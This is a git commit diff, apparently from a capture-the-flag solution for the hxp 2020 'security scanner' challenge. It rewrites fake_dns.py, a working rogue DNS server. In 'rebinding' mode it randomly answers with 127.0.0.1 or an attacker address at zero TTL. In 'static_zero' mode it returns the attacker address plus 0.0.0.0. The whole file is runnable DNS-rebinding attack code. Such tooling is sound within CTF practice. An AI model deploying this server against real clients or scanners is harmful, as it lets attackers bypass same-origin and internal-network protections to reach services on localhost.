9300961cf242cab7f8d7bdf7a6eb43d3743418a4
Ivan Komarov <Ivan.Komarov@dfyz.info>
2021-01-05 21:53:57 +0300

    Support new resolving modes in fake_dns.py and ditch NS support (we don't need it after all)

--- hxp-2020/security scanner/fake_dns.py
+++ hxp-2020/security scanner/fake_dns.py
@@ -1,3 +1,4 @@
+import argparse
 import ipaddress
 import os
 import socket
@@ -5,12 +6,17 @@ import struct
 import sys
 
 
-def addr_to_dns_repr(addr):
+A_TYPE = 1
+SUPPORTED_TYPES = [A_TYPE]
+IN_CLASS = 1
+
+
+def hostname_to_dns_repr(hostname):
     def label_to_dns_repr(label):
         label = label.encode()
         return bytes([len(label)]) + label
 
-    return b''.join(label_to_dns_repr(label) for label in addr.split('.'))
+    return b''.join(label_to_dns_repr(label) for label in hostname.split('.'))
 
 
 def pack_ttl_with_data(ttl, data):
@@ -20,73 +26,77 @@ def pack_ttl_with_data(ttl, data):
     ])
 
 
-def to_expected_query(addr, tp):
-    return addr + struct.pack('>HH', tp, IN_CLASS)
+def pack_a_answer(query, ips):
+    return b''.join([
+        query + pack_ttl_with_data(0, ipaddress.IPv4Address(ip).packed)
+        for ip in ips
+    ])
 
 
-A_TYPE = 1
-NS_TYPE = 2
-IN_CLASS = 1
-
-EXPECTED_ADDR = addr_to_dns_repr('fakegit.libz.so.')
-FAKEGIT_ADDR = socket.gethostbyname('libz.so')
-
-FAKE_TTL = 0
-NS_TTL = 3600
+def to_expected_query(hostname, tp):
+    return hostname + struct.pack('>HH', tp, IN_CLASS)
 
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock.bind(('', 53))
+if __name__ == '__main__':
+    p = argparse.ArgumentParser()
+    p.add_argument('hostname')
+    p.add_argument('--mode', required=True, choices=('rebinding', 'static_zero'))
+    args = p.parse_args()
 
-while True:
-    packet, client_addr = sock.recvfrom(512)
-    print(f'Got a packet from {client_addr}')
+    assert args.hostname.count('.') == 3 and args.hostname.endswith('.'), 'Invalid hostname'
+    expected_hostname = hostname_to_dns_repr(args.hostname)
+    fake_addr = socket.gethostbyname(args.hostname[args.hostname.index('.') + 1:])
 
-    header_len = 12
-    header_fmt = '>' + 'H'*6
-    if len(packet) < header_len:
-        print(f'Dropping the packet because it it too short ({len(packet)} bytes)', file=sys.stderr)
-        continue
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(('', 53))
 
-    header = packet[:header_len]
-    transaction_id, flags, query_count, *_ = struct.unpack(header_fmt, header)
+    while True:
+        packet, client_addr = sock.recvfrom(512)
+        print(f'Got a packet from {client_addr}')
 
-    if query_count != 1:
-        print(f'Dropping the packet because it has more than one query', file=sys.stderr)
-        continue
+        header_len = 12
+        header_fmt = '>' + 'H'*6
+        if len(packet) < header_len:
+            print(f'Dropping the packet because it it too short ({len(packet)} bytes)', file=sys.stderr)
+            continue
 
-    query = packet[header_len:header_len + len(EXPECTED_ADDR) + 4]
-    query_type = next((
-        tp
-        for tp in (A_TYPE, NS_TYPE)
-        if query.lower() == to_expected_query(EXPECTED_ADDR, tp)
-    ), None)
+        header = packet[:header_len]
+        transaction_id, flags, query_count, *_ = struct.unpack(header_fmt, header)
 
-    # Respond with an single answer to the first query and nothing else.
-    answer_count = query_type is not None
-    # Indicate that this message is a response and copy the "recursion desired" bit from the query.
-    # Also indicate this is an authoritative response for `fakegit.libz.so`.
-    # Zero out everything else (in particular, unset the "recursion available" bit).
-    answer_flags = 0b1000_0100_0000_0000 | (flags & 0b0000_0001_0000_0000)
-    response_header = struct.pack(header_fmt, transaction_id, answer_flags, query_count, answer_count, 0, 0)
+        if query_count != 1:
+            print(f'Dropping the packet because it has more than one query', file=sys.stderr)
+            continue
 
-    answer = b''.join([response_header, query])
-    expected_query = to_expected_query(EXPECTED_ADDR, query_type) if query_type is not None else None
-    if query_type == A_TYPE:
-        evil_ip = '127.0.0.1' if os.urandom(1)[0] % 4 == 0 else FAKEGIT_ADDR
-        packed_evil_ip = ipaddress.IPv4Address(evil_ip).packed
-        answer += b''.join([
-            expected_query,
-            pack_ttl_with_data(FAKE_TTL, packed_evil_ip),
-        ])
-        print(f'Responded with {evil_ip} to an A query')
-    elif query_type == NS_TYPE:
-        answer += b''.join([
-            expected_query,
-            pack_ttl_with_data(NS_TTL, addr_to_dns_repr('ns.libz.so.')),
-        ])
-        print(f'Responded to a NS query')
-    else:
-        print(f'Sending an empty response to unsupported query: {query}')
+        query = packet[header_len:header_len + len(expected_hostname) + 4]
+        query_type = next((
+            tp
+            for tp in SUPPORTED_TYPES
+            if query.lower() == to_expected_query(expected_hostname, tp)
+        ), None)
 
-    sock.sendto(answer, client_addr)
+        answer_count = 0
+        answer = b''
+
+        expected_query = to_expected_query(expected_hostname, query_type) if query_type is not None else None
+        if query_type == A_TYPE:
+            if args.mode == 'rebinding':
+                ips = ['127.0.0.1' if os.urandom(1)[0] % 4 == 0 else fake_addr]
+            elif args.mode == 'static_zero':
+                ips = [fake_addr, '0.0.0.0']
+            else:
+                raise Exception(f'Unsupported mode: {args.mode}')
+
+            answer_count = len(ips)
+            answer = pack_a_answer(expected_query, ips)
+
+            print(f'Responded with {ips} to an A query')
+        else:
+            print(f'Sending an empty response to unsupported query: {query}')
+
+        # Indicate that this message is a response and copy the "recursion desired" bit from the query.
+        # Also indicate this is an authoritative response.
+        # Zero out everything else (in particular, unset the "recursion available" bit).
+        answer_flags = 0b1000_0100_0000_0000 | (flags & 0b0000_0001_0000_0000)
+        response_header = struct.pack(header_fmt, transaction_id, answer_flags, query_count, answer_count, 0, 0)
+        response = b''.join([response_header, query, answer])
+        sock.sendto(response, client_addr)
